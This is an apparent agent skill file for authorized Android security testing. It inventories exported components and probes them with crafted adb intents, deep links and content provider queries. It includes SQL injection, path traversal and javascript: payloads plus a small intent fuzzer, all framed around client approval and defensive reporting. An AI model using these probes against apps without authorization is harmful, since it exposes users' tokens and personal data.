---
name: mobile-android-dynamic-intent-analysis
description: Use when you need to test Android inter-component
  communication during an authorized assessment. Covers parsing the
  manifest for exported activities, services, receivers, and providers
  with adb and apktool, sending crafted intents with am start,
  broadcast, and startservice, testing deep links and app links,
  probing content providers for data leaks, and reviewing pending
  intents. Use when the parent mobile-android-dynamic workflow reaches
  input testing, when static analysis flagged exported components, or
  when you need to prove a deeplink or intent handler is injectable,
  confirming behavior with Frida hooks where needed.
version: 1.0.0
domain: mobile
lifecycle: stable
last_verified: 2026-10-23
parent: mobile-android-dynamic
requires: [mobile-android-dynamic]
extends: []
relates: [mobile-android-dynamic]
tools:
  - name: adb
    version: 35.0
  - name: Frida
    version: 16.5
  - name: Python
    version: 3.12
---

Intents are Android's inter-process messages, and exported components
are the app's public API on the device. Any app, including an
attacker's, can send intents to exported components, so each one must
validate its input. This sub-skill is the method for inventorying
exported components from the manifest and proving which ones mishandle
crafted input, using only adb and the activity manager. Authorized
targets only.

## Quick Workflow

1. Extract and parse AndroidManifest.xml; list every component with
   exported=true or with intent filters.
2. For each exported component, note its intent filters, permissions,
   and expected extras from static analysis.
3. Send benign intents first to learn the expected input shape.
4. Send crafted inputs: malformed extras, injection strings, path
   traversal, oversized values.
5. Test deep links and app links with hostile URLs.
6. Probe content providers with query, insert, and update operations.
7. Watch logcat for crashes and stack traces throughout.
8. Write findings with the exact am command that reproduces each one.

## 1. Manifest inventory

```bash
# Dump the manifest from the installed package
adb shell dumpsys package com.example.target | grep -A30 "Activity Resolver Table" | head -50

# Or parse the APK offline with apktool (authorized test build)
apktool d target.apk -o apk-out
grep -B2 -A8 "android:exported=\"true\"" apk-out/AndroidManifest.xml | head -60
```

Example output shape you are looking for:

```xml
<activity android:name=".DeepLinkHandler" android:exported="true">
    <intent-filter>
        <action android:name="android.intent.action.VIEW" />
        <category android:name="android.intent.category.DEFAULT" />
        <category android:name="android.intent.category.BROWSABLE" />
        <data android:scheme="example" android:host="pay" />
    </intent-filter>
</activity>
<provider android:name=".DataProvider"
    android:authorities="com.example.target.provider"
    android:exported="true" />
```

Every `exported="true"` component is in scope for this sub-skill.
Components with intent filters are exported by default on older
targetSdk versions, so check those too.

## 2. Activity and deep link testing

```bash
# Start an exported activity directly
adb shell am start -n com.example.target/.DebugActivity

# Pass extras the way the app expects them, then mutate
adb shell am start -n com.example.target/.ProfileActivity --es user_id "123"

# Deep link with hostile parameters
adb shell am start -a android.intent.action.VIEW \
  -d "example://pay?amount=9999&to=attacker"

# Path traversal attempt in a deep link that loads files
adb shell am start -a android.intent.action.VIEW \
  -d "example://docs?file=../../../../etc/hosts"

# Injection probes in string extras
adb shell am start -n com.example.target/.SearchActivity \
  --es query "' OR '1'='1"
```

Example output shape for a crash that becomes a finding:

```
# logcat
E/AndroidRuntime: FATAL EXCEPTION: main
E/AndroidRuntime: java.lang.NumberFormatException: For input string: "9999x"
E/AndroidRuntime:   at com.example.target.PayHandler.onCreate(PayHandler.java:58)
```

The stack trace names the vulnerable handler and line. Even a plain
crash is a robustness finding; a crash that leaks a file path or SQL
error is more.

## 3. Broadcast receivers and services

```bash
# Send a broadcast to an exported receiver
adb shell am broadcast -a com.example.target.ACTION_SYNC --es token "abc"

# Ordered broadcast with a result receiver (tests priority handling)
adb shell am broadcast -a com.example.target.ACTION_UPDATE --ez force true

# Start and stop an exported service with extras
adb shell am startservice -n com.example.target/.SyncService --es url "https://test.example/"
adb shell am stopservice -n com.example.target/.SyncService
```

Watch for receivers that act on unauthenticated broadcasts: a sync
receiver that starts network operations or a receiver that writes
files based on broadcast extras is trusting every app on the device.
If the manifest declares a permission on the component, test whether
your test app without that permission is actually blocked.

## 4. Content provider probing

Exported providers are the most dangerous component class because they
expose structured data.

```bash
# List providers and their authorities
adb shell dumpsys package com.example.target | grep -A5 "Provider Resolver Table"

# Query a provider (read test)
adb shell content query --uri content://com.example.target.provider/users

# Probe for SQL injection in selection arguments
adb shell content query --uri content://com.example.target.provider/users \
  --where "name='x' OR '1'='1"

# Test path traversal in the URI
adb shell content query --uri content://com.example.target.provider/../../etc/hosts
```

Example output shape for a leaked provider:

```
# content query output
Row: 0 _id=1, name=alice, email=alice@example.com, token=eyJhbGciOi...
Row: 1 _id=2, name=bob, email=bob@example.com, token=eyJhbGciOi...
```

Any other app on the device can run the same command. A provider that
returns tokens or PII to an unauthenticated query is a High finding.

Also test write operations carefully on the authorized build:

```bash
# Insert and update probes (only on test data, with client approval)
adb shell content insert --uri content://com.example.target.provider/notes \
  --bind name:s:test --bind body:s:probe
adb shell content delete --uri content://com.example.target.provider/notes --where "name='test'"
```

## 5. Pending intents and intent hijacking review

```bash
# Static lead: find PendingIntent creation in decompiled code, then verify at runtime
# Hook PendingIntent.send to log what the app hands to other apps
```

```javascript
Java.perform(function () {
    var PI = Java.use('android.app.PendingIntent');
    PI.send.overload('android.content.Context', 'int', 'android.content.Intent')
        .implementation = function (ctx, code, intent) {
            console.log('[*] PendingIntent.send: ' + intent.toUri(0));
            return this.send(ctx, code, intent);
        };
});
```

A mutable PendingIntent with an implicit intent lets a malicious app
intercept or rewrite it. The fix is `FLAG_IMMUTABLE` and explicit
intents; verify the flags at the hook.

## 6. Fuzzing methodically

For components that take structured extras, generate cases instead of
hand-writing each one:

```python
# fuzz-intents.py: generate am commands for an exported activity
payloads = [
    "' OR '1'='1",
    "../../../../etc/passwd",
    "A" * 10000,
    "%s%s%s%s",
    "\u0000",
    "file:///etc/hosts",
    "javascript:alert(1)",
]
for p in payloads:
    print(f"adb shell am start -n com.example.target/.ViewerActivity --es url \"{p}\"")
```

```bash
python3 fuzz-intents.py > fuzz.sh
bash fuzz.sh 2>&1 | head -20
# Watch logcat in a second terminal for crashes
adb logcat --pid=$(adb shell pidof com.example.target) | grep -iE "exception|fatal"
```

Deduplicate crashes by stack trace: ten payloads crashing in the same
handler are one finding, not ten.

## Edge cases

- The component is exported but requires a permission your shell
  lacks. Note the permission as a partial control and test from a
  test app holding the permission if the client approves; signature
  permissions genuinely block third-party apps.
- Deep links work in the browser but not via am start. The intent
  filter may require BROWSABLE plus a specific action; replicate the
  exact intent the browser sends, which you can capture with an
  intent-interception test app.
- The provider query returns empty but the app clearly has data.
  The provider may check the calling package at runtime. Hook the
  query method with Frida to see the check, and note it as a
  defense-in-depth control rather than a vulnerability.
- Fuzzing crashes the system UI or the device. Keep fuzzing on an
  emulator snapshot you can restore, and throttle to a few cases per
  second.
- The manifest is obfuscated or the APK uses split installs. Parse
  the base APK's manifest; dynamic feature modules can add
  components at runtime, which you inventory with dumpsys after
  triggering the feature.
- Custom permissions with protectionLevel="normal" guard a
  component. Any app can request normal permissions, so this is no
  protection; only signature-level permissions count.

## Escalation

- An exported provider leaks data or allows writes. Capture the
  exact content commands, confirm with a second run, and report as
  High; this is remotely reachable by any on-device malware.
- A deep link handler passes input to WebView.loadUrl or
  Runtime.exec. Prove the injection with a benign payload (your test
  domain, a calculator-style marker), never a real exploit, and
  report immediately.
- The component set keeps growing as features load. Re-run the
  dumpsys inventory after exercising major features and diff against
  the baseline.
- You suspect intent spoofing between the app's own components
  (exported="false" bypass via task affinity). Test taskAffinity
  hijacking on the authorized build and report if activities can be
  overlaid.

## Detection and defender view

Intent attacks come from other apps on the device, so the defense is
entirely in the manifest and in input validation: export nothing that
does not need it, guard exported components with signature
permissions where possible, validate every extra as untrusted input,
and never put sensitive actions behind an unauthenticated broadcast.
Your report should list every exported component with a verdict
(safe, needs validation, vulnerable), because an inventory with
verdicts is what the client's developers can act on.

## Key references

- Android intents and intent filters:
  https://developer.android.com/guide/components/intents-filters
- Android app manifest element reference:
  https://developer.android.com/guide/topics/manifest/manifest-intro
- Content provider basics:
  https://developer.android.com/guide/topics/providers/content-provider-basics
- OWASP MSTG platform interaction testing:
  https://mas.owasp.org/MSTG/
- OWASP MASVS platform requirements:
  https://mas.owasp.org/MASVS/
- CWE-926 (Improper Export of Android Application Components):
  https://cwe.mitre.org/data/definitions/926.html
- CWE-927 (Use of Implicit Intent for Sensitive Communication):
  https://cwe.mitre.org/data/definitions/927.html
